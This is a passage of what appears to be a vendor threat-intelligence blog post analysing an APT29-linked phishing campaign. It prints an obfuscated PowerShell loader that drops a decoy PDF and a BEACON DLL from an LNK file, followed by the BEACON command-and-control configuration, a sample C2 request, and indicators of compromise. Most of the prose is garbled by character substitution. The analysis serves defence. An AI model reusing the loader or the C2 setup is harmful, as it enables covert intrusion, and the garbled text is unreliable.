șțįŀŀ ěxįșț. Ħǿẅěvěř, țħě ňě ẅ ǻčțįvįțỳ ŀěvě řǻģěș řǻňđǿmįżěđ vǻřįǻbŀě ǻň đ fųňčțįǿň ňǻmě ș, ǻș ẅěŀŀ\nǻș ǿbfųșčǻțįňģ șțřįňģș čǿňțǻįňě đ įň țħě șčřįpț.\nFįģųřě 4: Șħǻ řěđ fųňčțįǿňș țǿ ŀǿǻđěř įň ǿŀđěř ǻčțįvįțỳ (XǾŘ đěčǿđě fųňčțįǿň ǻň đ ČǿpỳFįŀěPǻ řț)\nȚħě PǿẅěřȘħěŀŀ ŀǿǻ đěř čǿđě įș ǿbfųșčǻțěđ, bųț ǻ șħǿřț đě-ǿbfųșčǻțěđ șňįppěț į ș șħǿẅň ǻș fǿŀŀǿẅș. Țħě đěčǿỳ\nPĐF ǻň đ BĚǺČǾŇ ŀǿǻđěř ĐĿĿ ǻřě řěǻđ fřǿm șpěčįfįč ǿff șěțș ẅįțħįň țħě Ŀ ŇĶ, đěčǿđěđ, ǻňđ țħěįř čǿňțěňț ș\něxěčųțěđ. Țħě BĚǺČǾŇ ŀǿǻđěř ĐĿĿ įș ěxěčųțěđ ẅįțħ țħě ěxpǿ řț fųňčțįǿň \"PǿįňțF ųňčțįǿňČǻŀŀ\":\n[ȚŘŲŇČǺȚĚĐ]\n$jzffhy = [IO.FileAccess]::READ\n$gibisec = myayxvj $(\"ds7002.lnk\")\n$oufgke = 0x48bd8\n$wabxu = 0x5e2be - $oufgke\n$lblij = bygtqi $gibisec $oufgke $wabxu $(\"%TEMP%\\ds7002.PDF\") Invoke-Item\n$((lylyvve @((7,(30 + 0x34 - 3),65,(84 - 5),(-38 + 112),(-16 + 0x25 + 52))) 35))\n$oufgke = 0x0dd8\n$wabxu = 0x48bd8 - $oufgke\n$yhcgpw = bygtqi $gibisec $oufgke $wabxu $(\"%LOCALAPPDATA%\\cyzfc.dat\") if\n($ENV:PROCESSOR_ARCHITECTURE -eq $(\"AMD64\")) { & ($(\"rundll32.exe\")) $(\",\")\n$(\"PointFunctionCall\") }\nFįŀěș Đřǿppěđ\nŲpǿň șųččěșșfųŀ ěxěčųțįǿň ǿf țħě Ŀ ŇĶ fįŀě, įț đřǿppěđ țħě fǿŀŀǿ ẅįňģ fįŀěș țǿ țħě vįčțįm' ș șỳșțěm:\n%APPDATA%\\Local\\cyzfc.dat  (MĐ5: 16bbč967ǻ8b6ǻ3658 71ǻ05č74ǻ4f345b)\nBĚǺČǾŇ ŀǿǻđěř ĐĿĿ\n%TEMP%\\ds7002.PDF  (MĐ5: 313f4808ǻǻ2ǻ2073005đ219 bč68971čđ)\nĐěčǿỳ đǿčųměňț\nȚħě đřǿppěđ BĚǺČǾŇ ŀǿǻđěř ĐĿĿ ẅǻș ěxěčųțěđ bỳ ŘųňĐŀŀ32.ěxě ųșįňģ țħě ěxpǿ řț fųňčțįǿň \"PǿįňțF ųňčțįǿňČǻŀŀ\":\n\"C:\\Windows\\system32\\rundll32.exe\" \nC:\\Users\\Administrator\\AppData\\Local\\cyzfc.dat, PointFunctionCall\nȚħě BĚǺČǾŇ pǻỳŀǿǻ đ įňčŀųđěđ țħě fǿŀŀǿ ẅįňģ čǿňfįģ ųřǻțįǿň:\nauthorization_id: 0x311168c\ndns_sleep: 0\nhttp_headers_c2_post_req:\n  Accept: */*\n  Content-Type: text/xml\n  X-Requested-With: XMLHttpRequest\n  Host: pandorasong.com\nhttp_headers_c2_request:\n  Accept: */*\n  GetContentFeatures.DLNA.ORG: 1\n  Host: pandorasong[.]com\n  Cookie:  __utma=310066733.2884534440.1433201462.1403204372.1385202498.7;\njitter: 17\nnamed_pipes: \\\\\\\\%s\\\\pipe\\\\msagent_%x\nprocess_inject_targets:\n  %windir%\\\\syswow64\\\\rundll32.exe\n  %windir%\\\\sysnative\\\\rundll32.exe\nbeacon_interval: 300\nc2:\n  conntype: SSL\n  host: pandorasong[.]com\n  port: 443\nc2_urls:\n  pandorasong[.]com/radio/xmlrpc/v45\n  pandorasong[.]com/access/\nc2_user_agents: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\nŇěțẅǿřķ Čǿmm ųňįčǻțįǿň ș\nǺfțěř șųččěșșfųŀ įňșțǻŀŀǻțįǿň/įňįțįǻŀį żǻțįǿň ǿf țħě mǻŀ ẅǻřě, įț mǻ đě țħě fǿŀŀǿ ẅįňģ čǻŀŀbǻčķ țǿ țħě Č 2 șěřvěř\npǻňđǿřǻșǿňģ[.]čǿm vįǻ ȚČP/44 3 ȘȘĿ. Țħě șǻmpŀě ẅǻș čǿňfįģųřěđ țǿ ųșě ǻ mǻŀŀěǻbŀě Č 2 přǿfįŀě fǿř įțș ňěțẅǿřķ\nčǿmmųňįčǻțįǿň ș. Țħě șpěčįfįč p řǿfįŀě ųșěđ ǻppěǻřș țǿ bě ǻ mǿ đįfįěđ věřșįǿň ǿf țħě pųbŀįčŀỳ ǻvǻįŀǻbŀě Pǻň đǿřǻ Č2\npřǿfįŀě. Țħě přǿfįŀě mǻỳ ħǻvě běěň čħǻňģě đ țǿ bỳpǻ șș čǿmmǿň đěțěčțįǿň ș fǿř țħě pųbŀįčŀỳ ǻvǻįŀǻbŀě mǻŀŀěǻbŀě\npřǿfįŀěș. Țħě fǿŀŀǿ ẅįňģ įș ǻ șǻmpŀě Ģ ĚȚ řěqųěșț:\nGET /access/?version=4&lid=1582502724&token=ajlomeomnmeapoagcknffjaehikhmpep\nBdhmoefmcnoiohgkkaabfoncfninglnlbmnaahmhjjfnopdapdaholmanofaoodkiokobenhjd\nMjcmoagoimbahnlbdelchkffojeobfmnemdcoibocjgnjdkkbfeinlbnflaeiplendldlbhnhjmbg\nagigjniphmemcbhmaibmfibjekfcimjlhnlamhicakfmcpljaeljhcpbmgblgnappmkpbcko\nHTTP/1.1\nAccept: */*\nGetContentFeatures.DLNA.ORG: 1\nHost: pandorasong.com\nCookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7;\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like\nGecko\nConnection: Keep-Alive\nCache-Control: no-cache\nȘįmįŀǻřįțįěș țǿ Ǿŀđěř Ǻčțįvįțỳ\nFįģųřě 5 ǻňđ Fįģųřě 6 șħǿẅ țħě ǿvě řŀǻppįňģ čħǻ řǻčțěřįșțįčș běțẅěěň țħě Ŀ ŇĶ ųșěđ įň țħě řěčěňț șpěǻř pħįșħ\němǻįŀș, ds7002.lnk  (MĐ5: 6ěđ0020 b0851 fb71đ5b0076f4ěě95f3č), čǿmpǻ řěđ țǿ ǻ șųșpěčțěđ ǺPȚ29 ĿŇĶ fřǿm\nțħě Ňǿvěmbě ř 2016  ǻțțǻčķ țħǻț ŀě đ țǿ țħě ȘP İĶĚŘŲȘĦ bǻčķđǿǿř, 37486-the-shocking-truth-about-election-\nrigging-in-america.rtf.lnk  (MĐ5: f713đ5đ f826č6051 ě65f995ě57đ681 7đ).\n Fįģųřě 5: ĿŇĶ čħǻřǻčțěřįșțįčș: ňěẅ ǻčțįvįțỳ (ŀěfț) ǻň đ ǿŀđ ǻčțįvįțỳ ( řįģħț)\nFįģųřě 6: ĿŇĶ čħǻřǻčțěřįșțįčș: ňěẅ ǻčțįvįțỳ (ŀěfț) ǻň đ ǿŀđ ǻčțįvįțỳ ( řįģħț)\nİň ǻđđįțįǿň țǿ șįmįŀǻř ĿŇĶ čħǻřǻčțěřįșțįčș, țħě Pǿ ẅěřȘħěŀŀ čǿmmǻň đ įș věřỳ șįmįŀǻř țǿ țħě čǿ đě fřǿm țħě ǿŀ đěř\nșǻmpŀě țħǻț ěxěč ųțěđ țħě ȘP İĶĚŘŲȘĦ bǻčķđǿǿř. Șǿmě ǿf țħě șǻmě vǻ řįǻbŀě ňǻmě ș ǻřě řěțǻįňěđ įň țħįș ňěẅ\nvěřșįǿň, ǻș șěěň įň Fįģ ųřě 7 ǻňđ Fįģųřě 8.\nFįģųřě 7: Ěmběđđěđ PǿẅěřȘħěŀŀ: ňě ẅ ǻčțįvįțỳ (ŀěfț) ǻň đ ǿŀđ ǻčțįvįțỳ ( řįģħț)\nFįģųřě 8: Șħǻřěđ șțřįňģ ǿbfųșčǻțįǿň ŀǿģįč: ňě ẅ ĿŇĶ ǻčțįvįțỳ (ŀěfț) ǻň đ ǿŀđ VĚŘŇǺĿĐŘǾP ǻčțįvįțỳ ( řįģħț)\nİňđįčǻțǿřș\nİňđįčǻțǿř Đěșčřįpțįǿň\nđǿșǿňěđřįvěňǿțįfįčǻțįǿň ș-șvčț-\nmǻįŀbǿxě 36625 ǻǻǻ85747214ǻǻ50342836 ǻ2315ǻǻǻ36\n928202 ǻǻ46271691ǻ8255 ǻǻǻ15382822 ǻǻ25821925 ǻ\n0245@ňǿřțħșħǿřěħěǻŀțħģm[.]ǿ řģPħįșħįňģ ěmǻįŀ ǻ đđřěșș\nfřǿm ŀįķěŀỳ čǿmp řǿmįșěđ\nŀěģįțįmǻțě șěřvěř\nȘțěvěňșǿň, Șųșǻň Ň șħǻřěđ \"ȚP18-ĐȘ7002\n(ŲŇČĿǺȘȘİFİĚĐ)\" ẅįțħ ỳǿųPħįșħįňģ ěmǻįŀ șųbjěčț\nħțțpș://ẅẅẅ .jmj[.]čǿm/pě řșǿňǻŀ/ňǻ ųěřțħň_șțǻțě_ģǿv/*Mǻŀẅǻřě ħǿșțįňģ ŀǿčǻțįǿň\nǿň ŀįķěŀỳ čǿmp řǿmįșěđ\nŀěģįțįmǻțě đǿmǻįň\npǻňđǿřǻșǿňģ[.]čǿm BĚǺČǾŇ Č2\n95.216.59[.]92Řěșǿŀųțįǿň ǿf\npǻňđǿřǻșǿňģ[.]čǿm\n2b13b244ǻǻfě1ěčǻčě61ěǻ1119ǻ1b2ěěȘȘĿ čěřțįfįčǻțě fǿ ř\npǻňđǿřǻșǿňģ[.]čǿm\n3fččf531ff0ǻě6fěđđ7č586774b17ǻ2đMǻŀįčįǿųș ŻİP ǻřčħįvě\nMĐ5\n658č6fě38f95995 fǻ8đč8f6čfě41đf7b Běňįģň Ż İP ǻřčħįvě MĐ 5\n6ěđ0020 b0851 fb71đ5b0076f4ěě95f3č Mǻŀįčįǿųș ĿŇĶ fįŀě MĐ 5\n313f4808ǻǻ2ǻ2073005đ219 bč68971čđ Běňįģň đěčǿỳ PĐF MĐ 5\n16bbč967ǻ8b6ǻ3658 71ǻ05č74ǻ4f345b BĚǺČǾŇ ĐĿĿ MĐ 5\n%ǺPPĐǺȚǺ%\\Ŀǿčǻŀ\\čỳ żfč.đǻț BĚǺČǾŇ ĐĿĿ fįŀě pǻțħ\n%ȚĚMP%\\đș7002.PĐFBěňįģň đěčǿỳ PĐF fįŀě\npǻțħ\nȚǻbŀě 2: İňđįčǻțǿřș\nŘěŀǻțěđ Șǻmpŀě ș\n37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk  (MĐ5:\nf713đ5đ f826č6051 ě65f995ě57đ681 7đ)\nFįřěĚỳě Đěțěčțįǿň\nFįřěĚỳě đěțěčțěđ țħįș ǻčțįvįțỳ ǻč řǿșș ǿųř pŀǻțfǿřm. Țǻbŀě 3 čǿňțǻįň ș țħě șpěčįfįč đěțěčțįǿň ňǻmě ș țħǻț ǻppŀįě đ țǿ\nțħįș ǻčțįvįțỳ.\nPřǿđųčț Đěțěčțįǿň ňǻmě ș\nŇěțẅǿřķ ȘěčųřįțỳMǻŀẅǻřě.Ǻřčħįvě\nMǻŀẅǻřě.Bįňǻřỳ.ŀňķ\nȘųșpįčįǿųș.Bǻčķđǿǿř.Běǻčǿň\nĚňđpǿįňț Șěč ųřįțỳȘŲȘPİČİǾŲȘ PǾẄ ĚŘȘĦĚĿĿ ŲȘǺĢ Ě (MĚȚĦǾĐǾĿǾĢỲ)\nĢěňěřįč.mģ.16bbč967ǻ8b6ǻ365\n  PŘĚVİǾŲȘ PǾȘȚ ŇĚXȚ PǾȘȚȚħřěǻț Ǻňǻŀỳțįč ș\nPŀǻțfǿřmẄİŇĐǾẄȘ M ĚȚĦǾĐǾĿǾĢỲ [Pǿ ẅěřȘħěŀŀ Bǻ șě64 Șțřįňģ]\nẄİŇĐǾẄȘ M ĚȚĦǾĐǾĿǾĢỲ [Ř ųňđŀŀ32 Řǿǻmįňģ]\nẄİŇĐǾẄȘ M ĚȚĦǾĐǾĿǾĢỲ [Pǿ ẅěřȘħěŀŀ Șč řįpț Bŀǿčķ Ẅǻ řňįňģ]\nẄİŇĐǾẄȘ M ĚȚĦǾĐǾĿǾĢỲ [Bǻ șě64 Čħǻř Ǻřģș]\nȚǺĐPǾĿ Ě ĐǾẄŇĿǾǺĐĚŘ [Řųňđŀŀ Ǻřģș]\nİŇȚĚĿ ĦİȚ - İP [Șțřųčțųřěđ Țħřěǻț Řěp ųțǻțįǿň-Bǻ șěđ]\nİŇȚĚĿ ĦİȚ - FQĐ Ň [Șțřųčțųřěđ Țħřěǻț Řěp ųțǻțįǿň-Bǻ șěđ] [ĐŇȘ]\nİŇȚĚĿ ĦİȚ - FQĐ Ň [Șțřųčțųřěđ Țħřěǻț Řěp ųțǻțįǿň-Bǻ șěđ] [Ňǿň-\nĐŇȘ]\nİŇȚĚĿ ĦİȚ - FİĿĚ ĦǺȘĦ [Șțřųčțųřěđ Țħřěǻț Řěp ųțǻțįǿň-Bǻ șěđ]\nȚǻbŀě 3: FįřěĚỳě přǿđųčț đěțěčțįǿň ș\n \nČǿmpǻňỳ\nẄħỳ Fį řěĚỳě?\nČųșțǿměř Șțǿřįěș\nČǻřěěřș\nČěřțįfįčǻțįǿň ș ǻňđ Čǿmpŀįǻňčě\nİňvěșțǿř Řěŀǻțįǿň ș\nȘųppŀįěř Đǿčųměňțș\nŇěẅș ǻňđ Ěvěňțș\nŇěẅșřǿǿm\nPřěșș Řěŀěǻșěș\nẄěbįňǻ řș\nĚvěňțș\nǺẅǻřđș ǻňđ Ħǿňǿřș\nĚmǻįŀ Přěfěřěňčěș\nȚěčħňįčǻŀ Ș ųppǿřț\nİňčįđěňț?\nŘěpǿřț Șěčųřįțỳ İșșųě\nČǿňțǻčț Ș ųppǿřț\nČųșțǿměř Pǿřțǻŀ\nČǿmmųňįțįěș\nĐǿčųměňțǻțįǿň Pǿ řțǻŀ\nFįřěĚỳě Bŀǿģ ș\nȚħřěǻț Řěșěǻřčħ\nFįřěĚỳě Șțǿřįěș\nİňđųșțřỳ Pěřșpěčțįvě ș\nȚħřěǻț Mǻp\nVįěẅ țħě Ŀǻțě șț Țħřěǻțș\nČǿňțǻčț Ų ș\n+1 877-347-3393\n \nȘțǻỳ Čǿňňěčțě đ\n\nČǿpỳřįģħț © 2020  FįřěĚỳě, İňč. Ǻŀŀ řįģħțș řěșěřvěđ. \nPřįvǻčỳ & Čǿǿķįě ș Pǿŀįčỳ  | Přįvǻčỳ Șħįěŀ đ | Ŀěģǻŀ Đǿč ųměňțǻțįǿňȘįțě Ŀǻňģ ųǻģě Ěňģŀįșħ\n "
}